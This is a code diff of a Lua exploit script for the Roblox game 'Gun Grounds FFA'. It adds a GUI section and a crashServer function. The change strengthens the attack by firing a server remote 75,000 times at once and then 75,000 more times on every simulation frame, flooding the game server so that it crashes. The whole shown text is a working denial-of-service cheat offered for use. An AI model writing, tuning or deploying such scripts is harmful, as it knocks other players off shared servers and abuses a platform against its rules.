@@ -4,11 +4,13 @@ local Window = lib:NewWindow("Gun Grounds FFA")
 local Section = Window:NewSection("Main")
 function crashServer()
   autoRespawn = nil; settings():FindService("NetworkSettings").IncomingReplicationLag = math.huge
-  for i = 1, 70000 do
+  for i = 1, 75000 do
     game.ReplicatedStorage.Remotes.PlayerReQuests.Deploy:FireServer("Play")
   end
   game.RunService.PreSimulation:Connect(function()
-    game.ReplicatedStorage.Remotes.PlayerReQuests.Deploy:FireServer("Play")
+    for i = 1, 75000 do
+      game.ReplicatedStorage.Remotes.PlayerReQuests.Deploy:FireServer("Play")
+    end
   end)
 end
 Section:CreateToggle("Auto Respawn", function(state)
